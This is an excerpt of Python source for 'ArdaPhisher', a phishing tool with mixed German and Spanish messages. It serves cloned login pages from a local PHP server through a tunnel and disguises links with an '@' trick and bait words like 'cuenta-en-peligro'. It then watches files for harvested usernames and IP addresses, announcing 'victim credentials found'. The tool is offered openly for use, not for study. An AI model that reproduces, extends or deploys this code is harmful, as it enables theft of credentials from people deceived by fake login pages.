...
def about():
    system("clear")
    slowprint(logo)
    print(bcyan+'[Nombre de la herramienta]  '+bpurple+' :[ArdaPhisher] ')
    print(bcyan+'[Version]   '+bpurple+'                 :[2.5]')
    print(bcyan+'[Author]    '+bpurple+'                 :[Arda] ')
    print(bcyan+'[Github]    '+bpurple+'                 :[Soon] ')
    print(bcyan+'[Instagram] '+bpurple+'                 :[arda.609]  ')
...
def requirements(folder,mask):
    ...
    while True:
        if os.path.exists(root+"/.websites/"+folder):
            ...
            internet()
            sprint("\n"+info+"Erforderliche Zeilen werden heruntergeladen :D.....\n")
...
def server():
    ...
    slowprint(logo)
    if termux:
        sprint("\n"+info+"ArdaPhisher, das beste Phishing-Tool:D")
        sleep(1)
    sprint("\n"+info2+"PHP-Server auf localhost starten:8080....")
    internet()
    ...
    while True:
        if not system("curl --output /dev/null --silent --head --fail 127.0.0.1:8080"):
            ...
            killer()
            exit(1)
    sprint("\n"+info2+"Tunneln mit derselben Adresse starten :D.....")
    internet()
...
def masking(url):
    ...
    if domain=="":
        ...
        if (bait==""):
            sprint("\n"+error+"Falsch geschrieben :c!")
            sprint("\n"+success+"Tu link es > https://"+ main)
            waiter()
        if bait.find(" ")!=-1:
            sprint("\n"+error+"Falsch geschrieben!")
            waiter()
    ...
    if (domain.find("http://")!=-1 or domain.find("https://")!=-1):
        ...
        domain= "https://"+domain
        bait= input("\n"+ask+"Schreiben Sie Wörter, die den Link beschreiben, und verwenden Sie dabei ein Leerzeichen - (Ejemplo: inicia-sesion, cuenta-en-peligro) > ")
        if bait=="":
            sprint("\n"+error+"No entendi :c!")
            final= domain+"@"+main
            sprint("\n"+success+"Dein Link ist > "+ final)
            waiter()
        if bait.find(" ")!=-1:
            sprint("\n"+error+"No entendi!")
            waiter()
...
def url_manager(url,num1,num2):
    internet()
    sprint("\n"+success+"Ihre Links wurden generiert :D: \n")
...
def waiter():
    sprint("\n"+info+bpurple+"Warten auf Login...." +bcyan+ " Pulsa "+bred+ "Ctrl+C" +bcyan+" ausgehen :D")
    try:
        while True:
            if os.path.isfile(root+"/.site/usernames.txt"):
                print("\n\n"+success+bgreen+"Ausweise des Opfers gefunden!\n\007")
                with open(root+"/.site/usernames.txt","r") as ufile:
                    ...
                    while j<o:
                        ...
                        j+=1
                print("\n"+info+"Gespeichert in usernames.txt")
                print("\n"+info+bblue+"Waiting for next....."+bcyan+ "Pulsa "+bred+ "Ctrl+C" +bcyan+ " ausgehen :D")
            ...
            if os.path.isfile(root+"/.site/ip.txt"):
                os.system("clear")
                print(logo)
                print("\n\n"+success+bgreen+"Ip vom Opfer Gefunden!\n\007")
                with open(root+"/.site/ip.txt","r") as ipfile:
                    ...
                    while h<p:
                        ...
                        h+=1
                print("\n"+info+"Ip gespeichert in ip.txt")
                print("\n"+info+blue+"warte auf weitere Informationen "+cyan+ "Pulsa "+red+ "Ctrl+C"+cyan+" ausgehen")
